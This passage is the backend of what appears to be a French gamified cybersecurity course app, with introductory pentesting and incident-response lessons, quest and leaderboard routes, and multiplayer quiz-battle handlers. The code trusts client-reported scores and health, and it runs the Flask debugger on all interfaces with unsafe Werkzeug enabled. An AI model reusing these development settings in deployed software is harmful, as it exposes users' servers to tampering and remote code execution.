                "title": "Introduction au pentesting",
                "content": """
# Introduction au Pentesting

## Qu'est-ce que le pentesting ?
Le test de pénétration (pentesting) simule une attaque réelle pour identifier les vulnérabilités.

## Méthodologies :

### 1. PTES (Penetration Testing Execution Standard)
1. **Pré-engagement** : Définir le scope
2. **Reconnaissance** : Collecte d'informations
3. **Énumération** : Identification des services
4. **Analyse de vulnérabilités**
5. **Exploitation**
6. **Post-exploitation**
7. **Rapport**

### 2. OWASP Testing Guide
- Guide spécialisé pour les applications web
- Méthodologie structurée
- Tests manuels et automatisés

## Types de tests :

### Boîte noire (Black Box)
- Aucune connaissance du système
- Simule un attaquant externe
- Plus réaliste

### Boîte blanche (White Box)
- Accès complet au code source
- Plus exhaustif
- Moins réaliste

### Boîte grise (Gray Box)
- Connaissance partielle
- Équilibre entre réalisme et exhaustivité
"""
            }
        ]
    },
    "incident_response": {
        "id": "incident_response",
        "title": "Réponse aux Incidents",
        "description": "Gérez efficacement les incidents de sécurité",
        "icon": "🚨",
        "difficulty": "Avancé",
        "duration": "50 min",
        "lessons": [
            {
                "id": 1,
                "title": "Cycle de vie de la réponse aux incidents",
                "content": """
# Réponse aux Incidents

## Cycle NIST (4 phases) :

### 1. Préparation
- **Équipe CSIRT** constituée
- **Procédures** documentées
- **Outils** préparés
- **Formation** régulière

### 2. Détection et Analyse
- **SIEM** (Security Information and Event Management)
- **Alertes** de sécurité
- **Analyse** des logs
- **Triage** des incidents

### 3. Confinement, Éradication, Récupération
- **Confinement** : Isoler la menace
- **Éradication** : Supprimer la cause
- **Récupération** : Restaurer les services

### 4. Leçons apprises
- **Post-mortem** détaillé
- **Amélioration** des procédures
- **Mise à jour** de la documentation

## Indicateurs de Compromission (IoC) :

### IoC Techniques
- Hashes de fichiers malveillants
- Adresses IP suspectes
- Noms de domaines malveillants
- Signatures réseau

### IoC Comportementaux
- Connexions inhabituelles
- Augmentation du trafic
- Accès à des fichiers sensibles
- Modifications système
"""
            }
        ]
    }
}

@app.route('/api/modules')
def get_modules():
    """Get all available learning modules"""
    modules = []
    for module_id, module_data in modules_data.items():
        modules.append({
            "id": module_data["id"],
            "title": module_data["title"],
            "description": module_data["description"],
            "icon": module_data["icon"],
            "difficulty": module_data["difficulty"],
            "duration": module_data["duration"]
        })
    return jsonify({"modules": modules})

@app.route('/api/module/<module_id>')
def get_module(module_id):
    """Get specific module with lessons"""
    if module_id in modules_data:
        return jsonify(modules_data[module_id])
    return jsonify({"error": "Module not found"}), 404

@app.route('/api/quests')
def get_quests():
    quests = []
    quest_dir = os.path.join(os.path.dirname(__file__), 'quests')
    
    if os.path.exists(quest_dir):
        for filename in os.listdir(quest_dir):
            if filename.endswith('.json'):
                try:
                    with open(os.path.join(quest_dir, filename), 'r', encoding='utf-8') as f:
                        quest_data = json.load(f)
                        module_name = filename.replace('.json', '')
                        quests.append({
                            "id": module_name,
                            "title": modules_data.get(module_name, {}).get("title", module_name.title()),
                            "icon": modules_data.get(module_name, {}).get("icon", "🎯"),
                            "difficulty": modules_data.get(module_name, {}).get("difficulty", "Débutant"),
                            "questions": quest_data
                        })
                except Exception as e:
                    print(f"Error loading {filename}: {e}")
    
    return jsonify({"quests": quests})

@app.route('/api/quest/<quest_id>')
def get_quest(quest_id):
    quest_file = os.path.join(os.path.dirname(__file__), 'quests', f'{quest_id}.json')
    
    if os.path.exists(quest_file):
        try:
            with open(quest_file, 'r', encoding='utf-8') as f:
                quest_data = json.load(f)
                return jsonify({
                    "id": quest_id,
                    "title": modules_data.get(quest_id, {}).get("title", quest_id.title()),
                    "icon": modules_data.get(quest_id, {}).get("icon", "🎯"),
                    "questions": quest_data
                })
        except Exception as e:
            return jsonify({"error": f"Error loading quest: {e}"}), 500
    else:
        return jsonify({"error": "Quest not found"}), 404

@app.route('/api/user/progress', methods=['POST'])
def update_progress():
    try:
        # Get auth token from headers
        auth_header = request.headers.get('Authorization')
        if not auth_header:
            return jsonify({"error": "No authorization token"}), 401
        
        token = auth_header.replace('Bearer ', '')
        if token not in sessions_db:
            return jsonify({"error": "Invalid token"}), 401
        
        username = sessions_db[token]
        data = request.get_json()
        
        # Update user progress
        if username in users_db:
            users_db[username]["progress"].update(data.get("progress", {}))
            users_db[username]["experience"] = data.get("experience", users_db[username]["experience"])
            users_db[username]["level"] = data.get("level", users_db[username]["level"])
        
        return jsonify({"message": "Progress updated successfully"})
        
    except Exception as e:
        return jsonify({"error": str(e)}), 500

@app.route('/api/leaderboard')
def get_leaderboard():
    # Create leaderboard from users
    leaderboard = []
    for username, user_data in users_db.items():
        leaderboard.append({
            "username": username,
            "level": user_data.get("level", 1),
            "experience": user_data.get("experience", 0)
        })
    
    # Sort by experience descending
    leaderboard.sort(key=lambda x: x["experience"], reverse=True)
    
    return jsonify({"leaderboard": leaderboard[:10]})  # Top 10

@app.route('/api/health')
def health_check():
    return jsonify({
        "status": "healthy",
        "timestamp": datetime.now().isoformat(),
        "users_count": len(users_db),
        "active_sessions": len(sessions_db)
    })

# Error handlers
@app.errorhandler(404)
def not_found(error):
    return jsonify({"error": "Endpoint not found"}), 404

@app.errorhandler(500)
def internal_error(error):
    return jsonify({"error": "Internal server error"}), 500


# ===================================
# WEBSOCKET EVENTS FOR MULTIPLAYER
# ===================================

@socketio.on('connect')
def handle_connect():
    """Gère la connexion d'un client"""
    print(f'Client connected: {request.sid}')
    emit('connected', {'sid': request.sid})

@socketio.on('disconnect')
def handle_disconnect():
    """Gère la déconnexion d'un client"""
    print(f'Client disconnected: {request.sid}')
    other_player = room_manager.leave_room(request.sid)
    if other_player:
        emit('opponent_left', {}, room=other_player)

@socketio.on('create_room')
def handle_create_room(data):
    """Crée une nouvelle salle de jeu"""
    player_name = data.get('player_name', 'Joueur')
    room = room_manager.create_room(request.sid, player_name)
    join_room(room.room_code)
    emit('room_created', {
        'room_code': room.room_code,
        'player_name': player_name,
        'message': f'Salle {room.room_code} créée avec succès!'
    })
    print(f'Room created: {room.room_code} by {player_name}')

@socketio.on('join_room')
def handle_join_room(data):
    """Rejoint une salle existante"""
    room_code = data.get('room_code', '').upper()
    player_name = data.get('player_name', 'Joueur')
    room = room_manager.join_room(room_code, request.sid, player_name)
    if room:
        join_room(room_code)
        # Envoyer au joueur qui rejoint : ses infos + le créateur
        emit('room_joined', {
            'room_code': room_code,
            'player_name': player_name,
            'opponent_name': room.creator_name,
            'message': f'Vous avez rejoint la salle {room_code}!'
        })
        # Envoyer au créateur : infos du nouveau joueur
        emit('opponent_joined', {
            'opponent_name': player_name,
            'message': f'{player_name} a rejoint votre salle!'
        }, room=room.creator_sid)
        print(f'{player_name} joined room {room_code}')
    else:
        emit('error', {'message': 'Salle introuvable ou complète'})

@socketio.on('start_game')
def handle_start_game(data):
    """Démarre la partie"""
    room = room_manager.get_player_room(request.sid)
    if room and room.start_game():
        # Envoyer les données complètes de la partie au créateur
        emit('game_started', {
            'message': 'La partie commence!',
            'current_turn': room.creator_sid,
            'your_turn': True,
            'player_name': room.creator_name,
            'opponent_name': room.opponent_name,
            'player_sid': room.creator_sid,
            'opponent_sid': room.opponent_sid
        }, room=room.creator_sid)
        
        # Envoyer les données complètes de la partie à l'adversaire
        emit('game_started', {
            'message': 'La partie commence!',
            'current_turn': room.creator_sid,
            'your_turn': False,
            'player_name': room.opponent_name,
            'opponent_name': room.creator_name,
            'player_sid': room.opponent_sid,
            'opponent_sid': room.creator_sid
        }, room=room.opponent_sid)
        
        print(f'Game started in room {room.room_code}: {room.creator_name} vs {room.opponent_name}')
    else:
        emit('error', {'message': 'Impossible de démarrer la partie'})

@socketio.on('player_answer')
def handle_player_answer(data):
    """Gère la réponse d'un joueur"""
    room = room_manager.get_player_room(request.sid)
    if not room:
        emit('error', {'message': 'Vous n\'êtes pas dans une salle'})
        return
    if not room.is_player_turn(request.sid):
        emit('error', {'message': 'Ce n\'est pas votre tour!'})
        return
    
    is_correct = data.get('is_correct', False)
    damage = data.get('damage', 0)
    attacker_new_health = data.get('new_health', 100)
    
    print(f'[PLAYER_ANSWER] Attacker: {request.sid}, Damage: {damage}, Correct: {is_correct}')
    
    # Mettre à jour la santé de l'attaquant
    room.update_player_state(request.sid, {'health': attacker_new_health})
    
    opponent_sid = room.get_opponent_sid(request.sid)
    
    if is_correct and opponent_sid:
        # Calculer la nouvelle santé de la victime
        opponent_state = room.get_player_state(opponent_sid)
        victim_current_health = opponent_state.get('health', 100)
        victim_new_health = max(0, victim_current_health - damage)
        
        print(f'[HEALTH_UPDATE] Victim health: {victim_current_health} -> {victim_new_health}')
        
        # Mettre à jour la santé de la victime dans le state
        room.update_player_state(opponent_sid, {'health': victim_new_health})
        
        # Envoyer à la victime : les dégâts + la santé de l'attaquant
        print(f'[EMIT] Sending opponent_attack to {opponent_sid}')
        emit('opponent_attack', {
            'damage': damage,
            'attacker_health': attacker_new_health,
            'your_new_health': victim_new_health,
            'message': 'Votre adversaire vous attaque!'
        }, room=opponent_sid)
        
        # Envoyer à l'attaquant : confirmation avec la santé de la victime
        print(f'[EMIT] Sending attack_confirmed to {request.sid}')
        emit('attack_confirmed', {
            'victim_new_health': victim_new_health,
            'your_health': attacker_new_health
        }, room=request.sid)
        
        # Vérifier la victoire/défaite
        if victim_new_health <= 0:
            attacker_name = room.creator_name if request.sid == room.creator_sid else room.opponent_name
            victim_name = room.opponent_name if request.sid == room.creator_sid else room.creator_name
            
            print(f'[GAME_OVER] {attacker_name} wins!')
            
            # Envoyer la victoire à l'attaquant
            emit('game_ended', {
                'winner': True,
                'message': f'Victoire ! Vous avez vaincu {victim_name} !'
            }, room=request.sid)
            
            # Envoyer la défaite à la victime
            emit('game_ended', {
                'winner': False,
                'message': f'Défaite ! {attacker_name} vous a vaincu !'
            }, room=opponent_sid)
            
            return  # Ne pas changer de tour si le jeu est terminé
    
    # Changer de tour seulement si le jeu continue
    room.switch_turn()
    print(f'[TURN] Turn changed to {room.current_turn}')
    emit('turn_changed', {'current_turn': room.current_turn, 'your_turn': False}, room=request.sid)
    emit('turn_changed', {'current_turn': room.current_turn, 'your_turn': True}, room=opponent_sid)

@socketio.on('update_health')
def handle_update_health(data):
    """Met à jour la santé d'un joueur"""
    room = room_manager.get_player_room(request.sid)
    if room:
        new_health = data.get('health', 100)
        room.update_player_state(request.sid, {'health': new_health})
        opponent_sid = room.get_opponent_sid(request.sid)
        if opponent_sid:
            emit('opponent_health_update', {'opponent_health': new_health}, room=opponent_sid)

@socketio.on('game_over')
def handle_game_over(data):
    """Gère la fin de partie"""
    room = room_manager.get_player_room(request.sid)
    if room:
        winner = data.get('winner')
        emit('game_ended', {'winner': winner, 'message': 'La partie est terminée!'}, room=room.room_code)
        room_manager.delete_room(room.room_code)

@socketio.on('leave_room')
def handle_leave_room_event():
    """Quitte la salle actuelle"""
    room = room_manager.get_player_room(request.sid)
    if room:
        leave_room(room.room_code)
        opponent_sid = room_manager.leave_room(request.sid)
        if opponent_sid:
            emit('opponent_left', {'message': 'Votre adversaire a quitté la partie'}, room=opponent_sid)
        emit('left_room', {'message': 'Vous avez quitté la salle'})


if __name__ == '__main__':
    print("🚀 Starting CyberForge Backend with WebSocket...")
    print("📂 Quest files location:", os.path.join(os.path.dirname(__file__), 'quests'))
    print("🌐 CORS enabled for: http://localhost:3000")
    print("💾 Using in-memory database (for development only)")
    print("🔐 Simple authentication enabled")
    print("🎮 Multiplayer mode enabled with Socket.IO")
    print("✅ Backend ready!")
    socketio.run(app, debug=True, host='0.0.0.0', port=5000, allow_unsafe_werkzeug=True)